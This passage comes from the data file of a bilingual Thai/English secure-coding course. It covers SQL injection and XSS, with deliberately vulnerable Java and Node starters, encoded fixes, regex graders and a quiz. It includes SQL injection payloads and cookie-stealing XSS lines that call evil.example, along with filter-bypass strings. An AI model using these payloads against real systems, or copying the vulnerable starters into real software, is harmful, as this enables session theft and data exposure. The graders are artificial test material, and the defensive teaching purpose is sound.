          en: 'This one concatenates straight into JPQL. Hibernate parses that whole string as the statement, so an attacker can inject JPQL syntax (and full SQL if it were a native query). Having an ORM helps nothing when you assemble the statement text yourself.'
        },
        whyWrong: [
          { th: 'derived query ถูกสร้างจากชื่อเมธอด ค่าที่ส่งเข้าไปกลายเป็น bound parameter เสมอ จึงปลอดภัย', en: 'A derived query is generated from the method name and the argument always becomes a bound parameter, so it is safe.' },
          { th: ':name คือ named parameter ที่ Hibernate ผูกค่าให้ต่างหากจากข้อความคำสั่ง จึงปลอดภัย — @Query จะอันตรายก็ต่อเมื่อคุณต่อสตริงเข้าไปในตัวมัน', en: ':name is a named parameter that Hibernate binds separately from the statement text, so it is safe — @Query only becomes dangerous when you concatenate into it.' },
          null,
          { th: 'native query ปลอดภัยได้ถ้าใช้ positional/named parameter อย่าง ?1 คู่กับ setParameter() ซึ่งข้อนี้ทำถูกแล้ว', en: 'A native query is safe when it uses positional or named parameters such as ?1 together with setParameter(), which this option does correctly.' }
        ]
      }
    ],

    sim: {
      kind: 'sql',
      config: {
        template: "SELECT id, username, email FROM users WHERE username = '{{payload}}'",
        table: 'users',
        rowCountAll: 4812,
        rowCountOne: 1
      },
      payloads: [
        { label: { th: 'ทำให้เงื่อนไข WHERE เป็นจริงเสมอ จะได้ข้อมูลออกมาทั้งตาราง', en: 'Classic tautology — always-true condition' }, value: "' OR '1'='1" },
        { label: { th: 'UNION — ดึงคอลัมน์ที่ endpoint ไม่ได้ตั้งใจเปิดเผย', en: 'UNION — pull columns the endpoint never meant to expose' }, value: "' UNION SELECT id, username, password_hash FROM users -- " },
        { label: { th: 'Comment out — ตัดเงื่อนไขที่เหลือทิ้งเพื่อล็อกอินเป็น admin', en: 'Comment out — drop the rest of the condition and log in as admin' }, value: "admin'-- " }
      ],
      allowCustom: true
    },

    references: [
      { label: 'OWASP SQL Injection Prevention Cheat Sheet', url: 'https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html' },
      { label: 'OWASP Query Parameterization Cheat Sheet', url: 'https://cheatsheetseries.owasp.org/cheatsheets/Query_Parameterization_Cheat_Sheet.html' },
      { label: 'CWE-89: Improper Neutralization of Special Elements used in an SQL Command', url: 'https://cwe.mitre.org/data/definitions/89.html' }
    ]
  };

 /* ======================================================================
 * 1.2 Cross-Site Scripting (XSS)
 * ==================================================================== */
  const XSS = {
    id: 'xss',
    title: { th: 'Cross-Site Scripting (XSS)', en: 'Cross-Site Scripting (XSS)' },
    severity: 'High',
    cwe: 'CWE-79',
    owasp: 'A03:2021 – Injection',
    category: { th: 'Injection', en: 'Injection' },
    estMinutes: 13,
    points: 120,

    intro: {
      th: 'หน้าผลการค้นหาเอาคำค้นของผู้ใช้ไปเขียนลง HTML ตรง ๆ ทั้งในเนื้อหาและใน attribute browser ไม่มีทางรู้ว่าอักขระไหนคือ "ข้อความที่ผู้ใช้พิมพ์" และอักขระไหนคือ "markup ที่แอปตั้งใจสร้าง" มันเลยตีความ < ที่ผู้ใช้ส่งมาว่าเป็นการเปิด tag จริง ๆ โค้ดที่ถูกแทรกจะรันภายใต้ origin ของเว็บคุณ เข้าถึง cookie, localStorage แล้วเรียก API ในนามผู้ใช้ที่ล็อกอินอยู่ได้ทั้งหมด',
      en: 'The search results page writes the user\'s keyword straight into the HTML, both in the body text and inside an attribute. The browser has no way to tell which characters are "text the user typed" and which are "markup the app meant to emit", so a < sent by the user really does open a tag. The injected code then runs under your site\'s origin with full access to cookies, localStorage, and any API call the logged-in user could make.'
    },
    attack: {
      th: 'ยิง q=<script>fetch(\'https://evil.example/?c=\'+document.cookie)</script> แล้วส่งลิงก์นั้นให้เหยื่อ (reflected XSS) หรือถ้าค่านี้ถูกเก็บลง database ก็จะยิงใส่ทุกคนที่เปิดหน้า (stored XSS) ถ้าเว็บบล็อกคำว่า script ก็ใช้ <img src=x onerror="fetch(\'https://evil.example/?c=\'+document.cookie)"> ที่ไม่มีคำว่า script อยู่เลย และถ้า attribute ครอบด้วย single quote ก็ใช้ \' onmouseover=alert(document.domain) x=\' เพื่อแหกออกมา',
      en: 'Send q=<script>fetch(\'https://evil.example/?c=\'+document.cookie)</script> and hand the victim that link (reflected XSS); if the value is stored, it fires for everyone who opens the page (stored XSS). If the site blocks the word script, use <img src=x onerror="fetch(\'https://evil.example/?c=\'+document.cookie)"> which contains no script tag at all, and for a single-quoted attribute use \' onmouseover=alert(document.domain) x=\' to break out.'
    },
    fix: {
      th: 'ใช้ context-aware output encoding: ก่อนเขียนค่าลงเอกสาร ให้แปลงอักขระที่มีความหมายพิเศษใน context นั้นให้กลายเป็นรูปแบบที่ parser มองเป็นข้อมูลเท่านั้น HTML text context ต้องแปลง & < > ส่วน attribute context ต้องแปลง " กับ \' ด้วย และ attribute ต้องมี quote ครอบเสมอ กลไกนี้ทำให้ payload โผล่บนหน้าจอเป็นข้อความ ไม่ใช่ tag เพราะ browser ไม่เคยเห็น < ที่เป็น < จริง',
      en: 'Use context-aware output encoding: before writing a value into the document, convert the characters that are meaningful in that specific context into a form the parser can only read as data. HTML text context needs & < > encoded; attribute context additionally needs " and \', and attributes must always be quoted. The payload then appears on screen as literal text rather than a tag, because the browser never sees a real <.'
    },
    keyPoints: {
      vuln: [
        { th: 'หน้าเว็บเขียนคำค้นของผู้ใช้ลง HTML ตรง ๆ ทั้งใน body และใน attribute', en: 'The page writes the user\'s keyword straight into the HTML body and into an attribute.' },
        { th: 'browser แยกข้อความกับ script ไม่ออก เลยตีความ < ที่ผู้ใช้ส่งเป็นการเปิด tag', en: 'The browser cannot tell text from markup, so a < the user sent really opens a tag.' },
        { th: 'browser มองว่า script ที่ถูกแทรกเป็นของเว็บเราเอง ทำให้อ่าน cookie และสวมสิทธิ์ผู้ใช้ที่ล็อกอินอยู่ได้', en: 'Injected code runs under the site\'s origin with full access to cookies and the session.' }
      ],
      attack: [
        { th: 'attacker ส่งค่า q=<script>...document.cookie...</script> หากระบบนำไปแสดงโดยไม่ encode เมื่อเหยื่อเปิดหน้า browser จะรัน script และ cookie อาจถูกส่งไปหา attacker', en: 'Send q=<script>…document.cookie…</script> to steal the victim\'s session.' },
        { th: 'การบล็อกคำว่า script อย่างเดียวไม่พอ เพราะ JavaScript รันผ่าน event handler ได้ เช่น <img src=x onerror=alert(1)> ซึ่งจะทำงานเมื่อรูปโหลดไม่สำเร็จ', en: 'If the word script is blocked, use <img src=x onerror=…> which has no script tag.' },
        { th: 'ถ้าค่าถูกวางใน attribute ที่ครอบด้วย \' attacker สามารถใส่ \' เพื่อปิด attribute เดิม แล้วเพิ่ม event handler เช่น onmouseover= เพื่อให้ JavaScript ทำงาน', en: 'Break out of a single-quoted attribute with \' onmouseover=… x=\'.' }
      ],
      fix: [
        { th: 'ก่อนนำข้อมูลไปแสดงใน HTML ให้ encode อักขระพิเศษ เช่น < > & เป็น &lt; &gt; &amp; เพื่อให้ browser มองเป็นข้อความ ไม่ใช่ tag', en: 'Apply context-aware output encoding before writing any value into the document.' },
        { th: 'ถ้าข้อมูลอยู่ใน HTML attribute ต้อง encode " และ \' เพิ่มด้วย เพื่อไม่ให้ input ปิด quote เดิมแล้วแทรก attribute หรือโค้ดต่อท้าย', en: 'Encode & < > in HTML text, and add " and \' when the value is inside an attribute.' },
        { th: 'ใส่ quote ครอบค่าของ attribute เสมอ เพราะถ้าไม่ครอบ attacker อาจใช้ช่องว่างเพื่อเพิ่ม attribute ใหม่ เช่น onerror= ได้โดยไม่ต้องปิด quote', en: 'Always wrap attributes in quotes so a payload cannot break out.' }
      ]
    },
    impact: {
      th: 'attacker สามารถรัน JavaScript ใน browser ของผู้ใช้ที่ล็อกอินอยู่ เพื่อขโมย session, เปลี่ยนเนื้อหาหรือฟอร์มบนหน้าเว็บ และทำรายการในนามผู้ใช้ได้',
      en: 'An attacker runs code in a logged-in customer\'s browser: stealing the session, rewriting the payment form to skim card numbers, or performing transactions as that user without them noticing.'
    },

    caseStudy: {
      year: 2018,
      title: {
        th: 'British Airways — สคริปต์ที่ถูกแทรกดักข้อมูลบัตรลูกค้า 429,612 ราย',
        en: 'British Airways — an injected script skimmed 429,612 customers\' card details'
      },
      body: {
        th: 'ระหว่าง 21 สิงหาคม ถึง 5 กันยายน 2018 attacker กลุ่ม Magecart แก้ไฟล์ JavaScript ที่เว็บและแอปของ British Airways โหลดอยู่ เพื่อดักค่าที่ลูกค้ากรอกในฟอร์มชำระเงินแล้วส่งไปยัง server ในโรมาเนีย ตามคำวินิจฉัยของ ICO มีผู้ได้รับผลกระทบ 429,612 ราย และ ICO ปรับ British Airways 20 ล้านปอนด์เมื่อวันที่ 16 ตุลาคม 2020 บทเรียนคือ JavaScript ที่รันบนหน้าเว็บมีสิทธิ์เข้าถึงข้อมูลในหน้าเดียวกับตัวเว็บ ไม่ว่าจะเข้ามาทาง XSS หรือ supply chain',
        en: 'Between 21 August and 5 September 2018, Magecart attackers modified a JavaScript file loaded by the British Airways website and app so that it captured what customers typed into the payment form and sent it to a server in Romania. The ICO found 429,612 people were affected and fined British Airways £20 million on 16 October 2020. The lesson is that any JavaScript running in your page has the same privileges as the page itself — whether it arrived through XSS or through the supply chain.'
      },
      source: {
        label: 'ICO — British Airways monetary penalty notice, 16 October 2020 (PDF)',
        url: 'https://ico.org.uk/media2/migrated/2618421/ba-penalty-20201016.pdf'
      }
    },

    codeReview: [
      {
        th: 'ถ้าเห็น ${...} หรือ + ตัวแปร อยู่ในสตริงที่มี < หรือ > หมายความว่ากำลังต่อ HTML ด้วยมือ ให้ถามว่าค่าตรงนั้นมาจากผู้ใช้ไหม ถ้าใช่ก็แทรก tag เข้ามาได้',
        en: 'grep for ${...} or + variable inside any string that also contains < or > — that is hand-written HTML.'
      },
      {
        th: 'ใน template ระวัง syntax ที่ปิด auto-escaping: {{{ }}} (Handlebars), <%- %> (EJS), |safe (Jinja/Nunjucks), th:utext (Thymeleaf), v-html (Vue), dangerouslySetInnerHTML (React) พวกนี้นำค่าดิบลง HTML โดยตรง',
        en: 'In templates, look for the syntax that turns auto-escaping off: Handlebars {{{ }}}, EJS <%- %>, Jinja/Nunjucks |safe, Thymeleaf th:utext, Vue v-html, React dangerouslySetInnerHTML.'
      },
      {
        th: 'ค่าที่วางใน attribute โดยไม่มี quote ครอบ เช่น value=${x} มีความเสี่ยงสูง เพราะ attacker สามารถใช้ช่องว่างเพื่อเพิ่ม attribute ใหม่ เช่น onfocus= ได้โดยไม่ต้องปิด quote เดิม',
        en: 'Values placed into an unquoted attribute (value=${x}) — there, a single space is enough to append onfocus=, no quote required.'
      },
      {
        th: 'ถ้าค่าจากผู้ใช้ถูกนำไปใส่ใน href/src หรืออยู่ภายในบล็อก <script> ต้องตรวจตาม context ให้ถูกต้อง เพราะ HTML encoding แบบทั่วไปอาจไม่เพียงพอสำหรับ URL หรือ JavaScript',
        en: 'User values flowing into href/src (javascript: URLs) or into a <script> block (that needs JavaScript-context encoding, not HTML encoding).'
      },
      {
        th: 'response ที่ส่ง HTML ควรระบุ Content-Type และ charset=UTF-8 ให้ชัดเจน เพื่อไม่ให้ browser ต้องเดาการเข้ารหัสตัวอักษร ซึ่งอาจทำให้การตีความข้อมูลผิดไปจากที่คาด',
        en: 'Responses that emit HTML without declaring Content-Type with charset=UTF-8 — letting the browser sniff the charset historically enabled UTF-7 XSS.'
      }
    ],

    testIt: {
      cmd: "curl -s -G 'http://localhost:8080/search' --data-urlencode 'q=<img src=x onerror=alert(1)>' | grep -o '<img[^>]*>'",
      note: {
        th: 'แอปที่มีช่องโหว่จะแสดง <img src=x onerror=alert(1)> ออกมาเป็น tag จริง (grep เจอ) ส่วนแอปที่แก้แล้ว grep จะไม่เจออะไรเลย เพราะ output กลายเป็น &lt;img src=x onerror=alert(1)&gt; ลองเปิดใน browser ดูจะเห็นข้อความ <img src=x...> แสดงเป็นตัวอักษรบนหน้าจอ',
        en: 'A vulnerable app emits <img src=x onerror=alert(1)> as a real tag (grep finds it); a fixed app produces nothing for grep because the output became &lt;img src=x onerror=alert(1)&gt;. Open it in a browser and you will see the literal text <img src=x ...> rendered on the page.'
      }
    },

    pitfalls: [
      {
        title: {
          th: 'กรองคำว่า <script> ออกจาก input',
          en: '"I strip out <script>"'
        },
        why: {
          th: 'JavaScript รันได้โดยไม่ต้องมี tag script เลย: <img src=x onerror=...>, <svg onload=...>, <body onpageshow=...>, <iframe srcdoc=...>, <a href="javascript:..."> มีอีกหลายร้อยแบบ นอกจากนี้การ replace ครั้งเดียวแบบไม่วนซ้ำยังโดน <scr<script>ipt> ซึ่งพอตัดคำว่า <script> ตรงกลางออกก็เหลือ <script> พอดี ทางแก้ที่ถูกต้องคือ encode ไม่ใช่ลบ — ถ้าผู้ใช้อยากพิมพ์คำว่า <script> ในข้อความก็ต้องแสดงได้ตามปกติ',
          en: 'JavaScript runs without a script tag at all: <img src=x onerror=...>, <svg onload=...>, <body onpageshow=...>, <iframe srcdoc=...>, <a href="javascript:..."> — there are hundreds of variants. A single non-recursive replace also loses to <scr<script>ipt>, where removing the inner <script> leaves a perfectly good <script> behind. The correct fix is to encode, not to delete: a user who wants to type the word <script> in a message should still see it.'
        },
        short: {
          th: 'encode อย่าลบ — JavaScript รันได้โดยไม่ต้องมี tag script',
          en: 'Encode, do not delete — JavaScript runs with no script tag at all.'
        }
      },
      {
        title: {
          th: 'ใช้ encodeURIComponent() ครอบค่าก่อนใส่ใน attribute',
          en: '"I wrap the value in encodeURIComponent() before putting it in an attribute"'
        },
        why: {
          th: 'encodeURIComponent ออกแบบมาสำหรับ URL ไม่ใช่ HTML และมันไม่ encode อักขระ \' เลย (\' อยู่ในชุดที่ไม่ถูกแปลง) พอ attribute ของคุณครอบด้วย single quote เช่น data-q=\'...\' attacker ก็แหกออกมาเติม onmouseover= ได้ตามปกติ ยิ่งกว่านั้นมันยังพัง UX (ช่องว่างกลายเป็น %20, ภาษาไทยกลายเป็น %E0%B8...) และไม่ได้กัน javascript: URL ใน href ให้ใช้ HTML attribute encoding ที่แปลง & < > " \' แล้วครอบ attribute ด้วย quote เสมอ',
          en: 'encodeURIComponent is designed for URLs, not HTML, and it does not encode the \' character at all (\' is in its unreserved set). So if your attribute is single-quoted — data-q=\'...\' — the attacker breaks straight out and appends onmouseover=. It also wrecks the UX (spaces become %20, Thai text becomes %E0%B8...) and does nothing about javascript: URLs in href. Use HTML attribute encoding, which handles & < > " \', and always quote your attributes.'
        },
        short: {
          th: 'encodeURIComponent ไม่ encode \' ให้ใช้ HTML attribute encoding แทน',
          en: 'encodeURIComponent leaves \' intact; use HTML attribute encoding instead.'
        }
      },
      {
        title: {
          th: 'ตั้ง CSP แล้วข้ามการ encode ตอนแสดงผล',
          en: '"We ship a Content-Security-Policy, so we do not need to encode"'
        },
        why: {
          th: 'CSP คือ defence in depth ไม่ใช่ตัวแทนของ output encoding หลาย policy ยังมี \'unsafe-inline\' อยู่เพราะแอปจำเป็นต้องใช้ inline script และต่อให้ไม่มี attacker ก็ยังทำ dangling markup injection ดูดข้อมูลในฟอร์มออกไปได้ หรือแทรก HTML หลอกผู้ใช้ (phishing form) โดยไม่ต้องรัน JavaScript สักบรรทัด ใช้ CSP เป็นชั้นที่สอง หลัง encode ถูกต้องแล้ว',
          en: 'CSP is defence in depth, not a replacement for output encoding. Plenty of real policies still carry \'unsafe-inline\' because the app needs inline scripts, and even without it an attacker can use dangling-markup injection to exfiltrate form contents, or inject convincing phishing HTML that never runs a line of JavaScript. Use CSP as the second layer, after you encode correctly.'
        },
        short: {
          th: 'CSP เป็นชั้นที่สอง ไม่ใช่ตัวแทนของ output encoding',
          en: 'CSP is a second layer, not a replacement for output encoding.'
        }
      }
    ],

    languages: {
      java: {
        filename: 'SearchResultServlet.java',
        lang: 'java',
        starter:
`package com.acme.shop.web;

import java.io.IOException;
import java.io.PrintWriter;
import jakarta.servlet.http.HttpServlet;
import jakarta.servlet.http.HttpServletRequest;
import jakarta.servlet.http.HttpServletResponse;

/** หน้าผลการค้นหา: สะท้อนคำค้นกลับไปแสดงให้ผู้ใช้ */
public class SearchResultServlet extends HttpServlet {

    @Override
    protected void doGet(HttpServletRequest req, HttpServletResponse resp)
            throws IOException {
        String keyword = req.getParameter("q");   // ควบคุมโดยผู้ใช้ทั้งหมด
        int hits = SearchService.count(keyword);

        resp.setContentType("text/html; charset=UTF-8");
        PrintWriter out = resp.getWriter();
        out.println("<div class='greeting'>Hello, " + keyword + "!</div>");
        out.println("<p data-q='" + keyword + "'>found " + hits + " items</p>");
    }
}`,
        solution:
`package com.acme.shop.web;

import java.io.IOException;
import java.io.PrintWriter;
import jakarta.servlet.http.HttpServlet;
import jakarta.servlet.http.HttpServletRequest;
import jakarta.servlet.http.HttpServletResponse;
import org.owasp.encoder.Encode;

public class SearchResultServlet extends HttpServlet {

    @Override
    protected void doGet(HttpServletRequest req, HttpServletResponse resp)
            throws IOException {
        String keyword = req.getParameter("q");
        int hits = SearchService.count(keyword);

        resp.setContentType("text/html; charset=UTF-8");
        PrintWriter out = resp.getWriter();
 // HTML text context: & < > ถูกแปลงเป็น entity
        out.println("<div class='greeting'>Hello, " + Encode.forHtml(keyword) + "!</div>");
 // attribute context: ต้องแปลง quote ทั้งสองชนิดด้วย และ attribute ต้องมี quote ครอบเสมอ
        out.println("<p data-q='" + Encode.forHtmlAttribute(keyword) + "'>found " + hits + " items</p>");
    }
}`,
        explain: {
          th: 'Encode.forHtml() แปลง & < > " \' ให้เป็น entity ก่อนค่าจะไปถึง HTML parser browser เลยเห็น &lt;script&gt; เป็นข้อความ ไม่ใช่จุดเริ่มของ tag ส่วน Encode.forHtmlAttribute() ใช้กฎของ attribute context ที่เข้มกว่า (ครอบคลุมทั้ง " และ \' เพื่อกันการหลุดออกจาก quote) OWASP Java Encoder ทำ output encoding ล้วน ๆ ไม่พยายามลบหรือ "ทำความสะอาด" อะไร คำค้นของผู้ใช้เลยยังแสดงผลตรงตามที่พิมพ์มา ถ้าต้องรับ HTML จริง (rich text) ให้ใช้ sanitizer อย่าง OWASP Java HTML Sanitizer แยกต่างหาก',
          en: 'Encode.forHtml() turns & < > " \' into entities before the value reaches the HTML parser, so the browser sees &lt;script&gt; as text rather than the start of a tag. Encode.forHtmlAttribute() applies the stricter attribute rules (covering both " and \' so the value cannot break out of the quotes). OWASP Java Encoder is pure output encoding — it never deletes or "cleans" anything, so the user\'s keyword still displays exactly as typed. If you genuinely need to accept HTML (rich text), use a separate sanitizer such as OWASP Java HTML Sanitizer.'
        },
        checks: [
          {
            id: 'no-raw-echo',
            label: { th: 'ไม่เขียนค่า keyword ดิบ ๆ ลงใน HTML', en: 'The raw keyword is never written into the HTML' },
            hint: { th: 'ทุกจุดที่มี + keyword ต้องเปลี่ยนเป็น + Encode.forHtml(keyword) หรือ Encode.forHtmlAttribute(keyword)', en: 'Every + keyword must become + Encode.forHtml(keyword) or + Encode.forHtmlAttribute(keyword)' },
            weight: 3,
            mustNotMatch: /\+\s*keyword\b/
          },
          {
            id: 'encode-html-context',
            label: { th: 'encode ค่าก่อนเขียนลง HTML text context', en: 'Encodes the value for the HTML text context' },
            hint: { th: 'ใช้ Encode.forHtml(keyword) จาก OWASP Java Encoder (หรือ HtmlUtils.htmlEscape / StringEscapeUtils.escapeHtml4)', en: 'Use Encode.forHtml(keyword) from OWASP Java Encoder (or HtmlUtils.htmlEscape / StringEscapeUtils.escapeHtml4)' },
            weight: 3,
            mustMatch: /Encode\.forHtml\s*\(|StringEscapeUtils\.escapeHtml4?\s*\(|HtmlUtils\.htmlEscape\s*\(|escapeHtml\s*\(/
          },
          {
            id: 'encode-attribute-context',
            label: { th: 'ใช้ตัว encode ที่เหมาะกับ attribute context', en: 'Uses an encoder suited to the attribute context' },
            hint: { th: 'ค่าที่อยู่ใน data-q=\'...\' ต้องผ่าน Encode.forHtmlAttribute() (หรือ encoder ที่แปลง quote ทั้งสองชนิด)', en: 'The value inside data-q=\'...\' must go through Encode.forHtmlAttribute() (or an encoder that escapes both quote characters)' },
            weight: 2,
            mustMatch: /forHtmlAttribute\s*\(|forHtmlUnquotedAttribute\s*\(|escapeHtml4\s*\(|htmlEscape\s*\(/
          },
          {
            id: 'declare-charset',
            label: { th: 'ประกาศ Content-Type พร้อม charset=UTF-8', en: 'Declares Content-Type with charset=UTF-8' },
            hint: { th: 'คง resp.setContentType("text/html; charset=UTF-8") ไว้ อย่าปล่อยให้ browser เดา charset เอง', en: 'Keep resp.setContentType("text/html; charset=UTF-8") — never let the browser sniff the charset' },
            weight: 1,
            mustMatch: /setContentType\s*\(\s*"text\/html;\s*charset=UTF-8"/i
          }
        ],
        traps: [
          {
            id: 'strip-script-tag',
            match: /\.replace(?:All|First)?\s*\(\s*"[^"]*script/i,
            message: {
              th: 'การลบคำว่า script ออกไม่ได้แก้ปัญหา: <img src=x onerror=...> และ <svg onload=...> รัน JavaScript ได้โดยไม่มีคำนี้เลย และ <scr<script>ipt> จะกลายเป็น <script> หลังคุณลบครั้งเดียว ให้ encode ค่าแทนการลบ',
              en: 'Deleting the word script does not fix this: <img src=x onerror=...> and <svg onload=...> run JavaScript without it, and <scr<script>ipt> becomes <script> after a single non-recursive removal. Encode the value instead of removing anything.'
            }
          },
          {
            id: 'url-encode-for-html',
            match: /URLEncoder\.encode\s*\(/,
            message: {
              th: 'URLEncoder.encode() เป็น encoding สำหรับ URL ไม่ใช่ HTML มันไม่ได้แก้ปัญหา context นี้ และยังทำให้ข้อความที่ผู้ใช้พิมพ์เพี้ยน (ช่องว่างกลายเป็น + ภาษาไทยกลายเป็น %E0%B8...) ให้ใช้ Encode.forHtml / Encode.forHtmlAttribute',
              en: 'URLEncoder.encode() is URL encoding, not HTML encoding. It does not address this context and it mangles what the user typed (spaces become +, Thai becomes %E0%B8...). Use Encode.forHtml / Encode.forHtmlAttribute.'
            }
          },
          {
            id: 'lowercase-denylist',
            match: /toLowerCase\s*\(\s*\)\s*\.\s*(?:contains|indexOf|startsWith)\s*\(\s*"(?:<|script|javascript|onerror|alert)/i,
            message: {
              th: 'denylist ของคำอันตรายเลี่ยงได้ไม่รู้จบ: <img>, <svg>, <details open ontoggle=...>, HTML entity, การเข้ารหัสซ้อน และอักขระ null คุณจะไล่ตามไม่มีวันจบ ให้เปลี่ยนไปใช้ output encoding ซึ่งถูกต้องโดยไม่ต้องเดาว่า payload หน้าตาแบบไหน',
              en: 'A denylist of dangerous words can be evaded endlessly: <img>, <svg>, <details open ontoggle=...>, HTML entities, double encoding, null bytes. You will never finish chasing it. Switch to output encoding, which is correct without guessing what the payload looks like.'
            }
          }
        ]
      },

      node: {
        filename: 'searchRoutes.js',
        lang: 'js',
        starter:
`const express = require('express');
const searchService = require('./searchService');
const app = express();

// GET /search?q=... — สะท้อนคำค้นกลับไปแสดงบนหน้าเว็บ
app.get('/search', async (req, res) => {
  const keyword = req.query.q || '';
  const hits = await searchService.count(keyword);

  res.type('html').send(\`
    <div class="greeting">Hello, \${keyword}!</div>
    <p data-q="\${keyword}">found \${hits} items</p>
  \`);
});

module.exports = app;`,
        solution:
`const express = require('express');
const he = require('he');                 // HTML entity encoder ที่ผ่านการทดสอบแล้ว
const searchService = require('./searchService');
const app = express();

// he.escape() แปลง & < > " ' — ครอบคลุมทั้ง text context และ attribute ที่มี quote ครอบ
const esc = (v) => he.escape(String(v));

app.get('/search', async (req, res) => {
  const keyword = req.query.q || '';
  const hits = await searchService.count(keyword);

  res.type('html').send(\`
    <div class="greeting">Hello, \${esc(keyword)}!</div>
    <p data-q="\${esc(keyword)}">found \${hits} items</p>
  \`);
});

module.exports = app;`,
        explain: {
          th: 'he.escape() แปลง & < > " \' เป็น HTML entity ก่อนค่าจะถูกต่อเข้ากับ markup ทำให้ HTML parser ของ browser มอง payload เป็นข้อความ ไม่ใช่ tag ที่รันได้ และเมื่อ attribute มี quote ครอบพร้อม encode " ค่า input ก็ไม่สามารถปิด attribute เดิมเพื่อแทรกโค้ดต่อได้ ในโปรเจกต์จริงควรใช้ template engine ที่ auto-escape และระวังเฉพาะจุดที่จงใจปิด escaping',
          en: 'he.escape() converts & < > " \' into HTML entities before the value is concatenated into the markup, so the browser\'s HTML parser never sees a < that opens a tag — the payload lands as an ordinary text node instead of an executable element. Critically, the attribute keeps its double quotes and he.escape encodes ", so the value cannot break out of it. In a real project the better move is a template engine with automatic escaping (EJS <%= %>, Nunjucks, Handlebars {{ }}), which leaves you only the deliberate escape-hatch syntax to review.'
        },
        checks: [
          {
            id: 'no-raw-interpolation',
            label: { th: 'ไม่ฝังค่า keyword ดิบ ๆ ลงใน HTML', en: 'The raw keyword is never interpolated into the HTML' },
            hint: { th: 'เปลี่ยน ${keyword} ทุกจุดเป็น ${esc(keyword)}', en: 'Change every ${keyword} to ${esc(keyword)}' },
            weight: 3,
            mustNotMatch: /\$\{\s*(?:keyword|req\.query\.\w+)\s*\}/
          },
          {
            id: 'encode-before-output',
            label: { th: 'encode ค่าด้วย library ก่อนส่งออก', en: 'Encodes the value with a library before sending it' },
            hint: { th: "npm i he แล้วใช้ he.escape(String(value)) หรือใช้ template engine ที่ auto-escape", en: 'npm i he and use he.escape(String(value)), or switch to an auto-escaping template engine' },
            weight: 3,
            mustMatch: /\bhe\s*\.\s*(?:escape|encode)\s*\(|escapeHtml\s*\(|require\s*\(\s*['"]escape-html['"]\s*\)/
          },
          {
            id: 'attribute-quoted',
            label: { th: 'ค่าใน attribute ยังมี double quote ครอบ', en: 'The attribute value stays wrapped in double quotes' },
            hint: { th: 'คง data-q="${...}" ไว้ อย่าถอด quote ออก เพราะ attribute ที่ไม่มี quote แค่เว้นวรรคก็แทรก onfocus= ได้', en: 'Keep data-q="${...}" — an unquoted attribute lets a single space introduce onfocus=' },
            weight: 2,
            mustMatch: /data-q\s*=\s*"\$\{/
          }
        ],
        traps: [
          {
            id: 'strip-script-tag',
            match: /\.replace(?:All)?\s*\(\s*(?:\/[^/\n]{0,60}script|['"][^'"]{0,60}script)/i,
            message: {
              th: 'การลบ tag script ออกจากค่าไม่ได้ปิดช่องโหว่: <img src=x onerror=...>, <svg onload=...>, <details open ontoggle=...> รันโค้ดได้โดยไม่ต้องมีคำว่า script และ <scr<script>ipt> จะเหลือ <script> หลังลบครั้งเดียว ให้ encode แทนการลบ',
              en: 'Stripping script tags does not close this hole: <img src=x onerror=...>, <svg onload=...>, <details open ontoggle=...> all execute without the word script, and <scr<script>ipt> leaves a working <script> after one pass. Encode instead of deleting.'
            }
          },
          {
            id: 'encode-uri-component',
            match: /encodeURIComponent\s*\(/,
            message: {
              th: 'encodeURIComponent() เป็น encoding ของ URL ไม่ใช่ HTML และมันไม่แปลงอักขระ \' เลย ถ้า attribute ครอบด้วย single quote attacker ก็แหกออกมาเติม onmouseover= ได้ทันที แถมยังทำให้คำค้นภาษาไทยแสดงผลเป็น %E0%B8... ให้ใช้ he.escape() หรือ template engine ที่ auto-escape',
              en: 'encodeURIComponent() is URL encoding, not HTML encoding, and it does not touch the \' character at all — inside a single-quoted attribute the attacker breaks straight out and appends onmouseover=. It also turns Thai keywords into %E0%B8... on screen. Use he.escape() or an auto-escaping template engine.'
            }
          }
        ]
      }
    },

    hints: [
      {
        th: 'ลองถามตัวเองว่า "ค่านี้กำลังจะไปอยู่ใน context ไหน" — text node, attribute, URL, หรือในบล็อก <script> แต่ละ context มีอักขระอันตรายคนละชุด และต้องใช้ตัว encode คนละตัว',
        en: 'Ask which context the value is landing in — text node, attribute, URL, or inside a <script> block. Each context has a different set of dangerous characters and needs a different encoder.'
      },
      {
        th: 'อย่าลบหรือกรองอักขระทิ้ง ให้แปลงมันเป็น entity: & → &amp;, < → &lt;, > → &gt;, " → &quot;, \' → &#x27; ผู้ใช้ยังเห็นข้อความเดิมทุกตัวอักษร แต่ browser ไม่ตีความเป็น markup',
        en: 'Do not delete or filter characters — convert them: & → &amp;, < → &lt;, > → &gt;, " → &quot;, \' → &#x27;. The user still sees exactly what they typed, but the browser never reads it as markup.'
      },
      {
        th: 'Java: org.owasp.encoder.Encode.forHtml() สำหรับ text และ Encode.forHtmlAttribute() สำหรับ attribute — Node: he.escape() หรือย้ายไปใช้ template engine ที่ auto-escape (EJS <%= %>, Nunjucks)',
        en: 'Java: org.owasp.encoder.Encode.forHtml() for text and Encode.forHtmlAttribute() for attributes. Node: he.escape(), or move to an auto-escaping template engine (EJS <%= %>, Nunjucks).'
      }
    ],

    quiz: [
      {
        q: {
          th: 'ทีมกรองคำว่า <script> ออกจาก input ทุกตัวก่อนนำไปแสดงใน HTML ข้อใดถูกต้อง',
          en: 'A team strips every <script> occurrence from input before rendering it into HTML. Which statement is true?'
        },
        choices: [
          { th: 'ปลอดภัยแล้ว เพราะถ้าไม่มี tag script ก็รัน JavaScript ไม่ได้', en: 'It is safe — without a script tag no JavaScript can run' },
          { th: 'ยังไม่ปลอดภัย เพราะ event handler เช่น <img src=x onerror=...> รันโค้ดได้โดยไม่ต้องมี tag script', en: 'Still unsafe — event handlers such as <img src=x onerror=...> execute without any script tag' },
          { th: 'ปลอดภัยแล้ว ถ้าเปลี่ยนการกรองให้เป็นแบบ case-insensitive ด้วย', en: 'It is safe once the filter is made case-insensitive as well' },
          { th: 'ปลอดภัยแล้ว เพราะเราส่ง Content-Security-Policy ไปด้วย จึงไม่จำเป็นต้อง encode', en: 'It is safe because we also send a Content-Security-Policy, so encoding is unnecessary' }
        ],
        answer: 1,
        why: {
